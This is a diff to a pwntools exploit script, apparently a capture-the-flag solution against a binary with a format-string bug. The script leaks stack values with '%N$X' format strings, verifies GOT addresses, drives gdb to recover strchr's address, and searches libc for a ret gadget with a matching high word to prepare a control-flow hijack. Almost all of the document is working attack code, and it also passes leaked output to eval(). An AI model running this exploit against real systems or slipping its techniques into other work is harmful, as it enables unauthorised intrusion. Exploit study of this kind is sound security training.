@@ -72,18 +72,18 @@ shell.ln(['-s',binary, symlink])
 # Params of (110,120) chosen after letting it run (0,500) once.
 # This is just quicker since I'm running it multiple times to dev.
 for index in range(110,120):
-    ch = shell.run('python noarg.py ./%s' % symlink)
-    ch.sendline('%{}$X'.format(index))
-    response = ch.recvline().strip()
-    try:
-        data = unhex(response)
-        assert len(data) == 4
-    except Exception:
-        continue
+    with shell.run('python noarg.py ./%s' % symlink) as ch:
+        ch.sendline('%{}$X'.format(index))
+        response = ch.recvline().strip()
+        try:
+            data = unhex(response)
+            assert len(data) == 4
+        except Exception:
+            continue
 
-    offset = cyclic_find(data[::-1])
-    if 0 <= offset and offset < 0x100:
-        break
+        offset = cyclic_find(data[::-1])
+        if 0 <= offset and offset < 0x100:
+            break
 
 log.info("Found binary name on stack in argument %i at offset %i" % (index, offset))
 
@@ -120,10 +120,10 @@ shell.ln(['-s', binary, symlink])
 #
 for name in indexes.keys():
     log.info("Verifying %r..." % name)
-    ch = shell.run('python noarg.py $%r' % symlink)
-    ch.sendline('%{}$X'.format(indexes[name]))
-    resp = ch.recvline().strip()
-    assert eval('0x' + resp) == elf.got[name]
+    with shell.run('python noarg.py $%r' % symlink) as ch:
+        ch.sendline('%{}$X'.format(indexes[name]))
+        resp = ch.recvline().strip()
+        assert eval('0x' + resp) == elf.got[name]
 
 #
 # Step 1C
@@ -204,7 +204,20 @@ ch.sendline(fmt)
 # returned during the GOT linking stage.  IDA doesn't show any x-refs
 # to the routine, or any symbol information for it.
 #
-strchr    = 0xf7ec0f20 # remote
+
+with shell.run('gdb %r' % binary) as gdb:
+    gdb.send('''
+    set prompt
+    break *main
+    run
+    set {void*}($sp+4)=getenv("PATH")
+    set {void*}($sp+8)=0
+    set $pc=%#x
+    finish
+    ''' % elf.plt['strchr'])
+    gdb.clean(2)
+    gdb.sendline('printf "%%#x\\n",*%#x' % elf.got['strchr'])
+    strchr = eval(gdb.recvline())
 
 # Find any 'ret' gadget that has the same hiword as strchr
 # The easiest way to do this is to just search for a ret.
@@ -213,6 +226,7 @@ while libc.read(retn, 1) != '\xc3':
     retn += 1
 
 log.info("%#x strchr" % strchr)
+log.info("%#x strchr (as exported)" % libc.symbols['strchr'])
 log.info("%#x ret" % retn)
 assert strchr & 0xffff0000 == retn & 0xffff0000
 
